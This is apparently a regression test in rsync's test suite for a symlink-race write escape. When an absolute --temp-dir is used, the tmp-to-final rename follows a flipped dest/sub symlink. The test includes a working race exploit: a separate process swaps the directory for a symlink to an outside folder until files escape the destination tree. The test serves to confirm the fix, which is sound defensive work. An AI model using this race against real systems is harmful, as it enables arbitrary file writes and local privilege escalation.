#!/usr/bin/env python3
# Receiver write-escape via a symlink race on finish_transfer()'s tmp->final
# rename when an absolute --temp-dir (or --partial-dir) is in use.
#
# do_rename_at() (syscall.c) confines a rename relative to held dirfds, but it
# bailed out to the unconfined path-based do_rename() whenever EITHER path was
# absolute.  With an absolute --temp-dir the receiver's temp file is an absolute
# path, so the tmp->final rename took that bail and re-resolved the destination
# from the path -- following a `dest/sub` component flipped from a directory to a
# symlink mid-transfer, landing the transferred file OUTSIDE the destination
# tree (an arbitrary write / LPE for a local attacker who can flip a dest parent).
#
# RED before the fix (files escape to outside/); GREEN once do_rename_at confines
# the relative destination even when the source temp path is absolute.
#
# Found by Omar Elsayed; this is the framework version of that demonstration,
# with no rsync.c instrumentation -- a separate-process flipper wins the race.

import os
import subprocess
import time

from rsyncfns import race_budget, SCRATCHDIR, rmtree, rsync_argv, test_fail

# Unique per-invocation base: this test's rename storm can corrupt the `dest`
# directory on some filesystems (OpenBSD FFS leaves an un-removable dir), and a
# fixed name would let that wreck block a later pass's setup.  See _move_aside().
base = SCRATCHDIR / f'rename-fullpath-{os.getpid()}'
src = base / 'src'
dest = base / 'dest'
outside = base / 'outside'
tmpd = base / 'tmpd'            # absolute --temp-dir, OUTSIDE the destination
rmtree(base)
(src / 'sub').mkdir(parents=True)
for i in range(40):
    (src / 'sub' / f'f{i}').write_text('payload\n')
dest.mkdir()
outside.mkdir()
tmpd.mkdir()

sub = dest / 'sub'            # the parent the attacker flips
link = dest / '.sublink'     # a symlink -> outside, swapped in for `sub`
link.symlink_to(outside)


def push():
    # --temp-dir must precede the paths: runtests runs with POSIXLY_CORRECT, which
    # disables getopt permutation, so an option after the paths is treated as a path.
    subprocess.run(
        rsync_argv('-a', f'--temp-dir={tmpd}', f'{src}/', f'{dest}/'),
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )


# Positive control: a normal push lands the files in dest/sub, so the temp+rename
# write path is genuinely exercised and the race below isn't vacuous.
rmtree(sub)
sub.mkdir()
push()
if not (sub / 'f0').is_file():
    test_fail("positive control: a normal --temp-dir push did not write files "
              "into dest/sub, so the rename race window would be vacuous")
for f in outside.iterdir():
    f.unlink()

# Separate-process flipper: keep `sub` flipping between a real directory and the
# symlink->outside (an atomic 3-rename swap with `link`).  A separate process is
# needed to flip fast enough to win the rename window.  It self-terminates when
# the test process goes away (getppid changes) and after a hard deadline, so a
# killed test can't leak an orphan that poisons later tests (see start_path_flipper).
flip_code = (
    "import os, sys, time\n"
    "sub, link = sys.argv[1], sys.argv[2]\n"
    "scratch = sub + '.flip'\n"
    "parent = os.getppid()\n"
    "deadline = time.time() + 120\n"
    "while time.time() < deadline and os.getppid() == parent:\n"
    "    try:\n"
    "        os.makedirs(sub, exist_ok=True)\n"
    "        os.rename(sub, scratch); os.rename(link, sub); os.rename(scratch, link)\n"
    "        os.rename(sub, scratch); os.rename(link, sub); os.rename(scratch, link)\n"
    "    except OSError:\n"
    "        pass\n"
)
flip = subprocess.Popen(['python3', '-c', flip_code, str(sub), str(link)])
try:
    deadline = time.monotonic() + race_budget(10.0)
    while time.monotonic() < deadline:
        # Start each round from a real (absent->mkdir'd) dest/sub so rsync sees a
        # directory at flist time; the flip then happens during the file writes.
        rmtree(sub)
        try:
            sub.unlink()
        except OSError:
            pass
        push()
        # Count only escaped regular files (the transferred payload); the
        # flipper/reset churn can momentarily leave a dir or symlink in outside,
        # which is harness noise, not a write escape.
        escaped = sorted(p.name for p in outside.iterdir()
                         if p.is_file() and not p.is_symlink())
        if escaped:
            test_fail(
                "rename-fullpath symlink race: files were written OUTSIDE the "
                f"destination tree ({escaped}) -- finish_transfer's tmp->final "
                "rename followed a flipped dest/sub symlink because an absolute "
                "--temp-dir made do_rename_at fall back to the unconfined "
                "do_rename().")
finally:
    flip.terminate()
    try:
        flip.wait(timeout=5)
    except subprocess.TimeoutExpired:
        flip.kill()

# No escape within the race budget.
